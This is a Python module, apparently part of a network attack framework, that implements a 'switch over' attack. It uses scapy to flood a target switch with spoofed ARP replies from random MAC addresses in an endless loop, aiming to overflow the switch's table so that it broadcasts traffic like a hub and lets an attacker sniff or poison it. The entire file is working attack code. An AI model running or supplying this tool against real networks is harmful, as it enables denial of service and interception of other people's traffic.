import util
from scapy.all import ARP, Ether, sendp
from scapy.volatile import RandMAC
from scapy.layers.l2 import getmacbyip
from threading import Thread
from parameter import Parameter
from zoption import Zoption


class switchover(Parameter):
    """ Flood a switch with ARP packets in an attempt
        to get it to failover into a hub.  Not all switch's
        will do this, but this is the general case.
    """
    def __init__(self):
        super(switchover, self).__init__('Switch Over')
        self.switch = None
        self.sent = 0
        self.config.update({"target":Zoption(type = "ip", 
                                      value = "FF:FF:FF:FF:FF:FF",
                                      required = False, 
                                      display = "Switch address")
                           })
        self.info = """
                    In some switches, if the ARP table is overflowed,
                    the device will switch from routing packets to simply
                    spewing packets to each port, a la a hub.  This will
                    allow an attacker who may have been unable to sniff
                    or poison certain traffic the ability to."""

    def initialize(self):
        util.Msg("Starting switch flood...")
        self.switch = getmacbyip(self.config['target'].value)
        self.running = True

        thread = Thread(target=self.spam)
        thread.start()
        return True

    def spam(self):
        """ Begin spamming the switch with ARP packets from
            random MAC's
        """
        arp = ARP(op=2, psrc='0.0.0.0', hwdst=self.switch)
        while self.running:
            pkt = Ether(src=RandMAC(), dst=self.switch)
            pkt /= arp
            sendp(pkt)
            self.sent += 1
            if self.sent % 50 == 0:
                self.log_msg('Sent %d requests...' % (self.sent))

    def view(self):
        """ Dump out the number of requests initially
        """
        util.Msg('Sent %d MAC requests thus far' % (self.sent))
        super(switchover, self).view()

    def session_view(self):
        return "Spamming %s" % self.config['target'].value
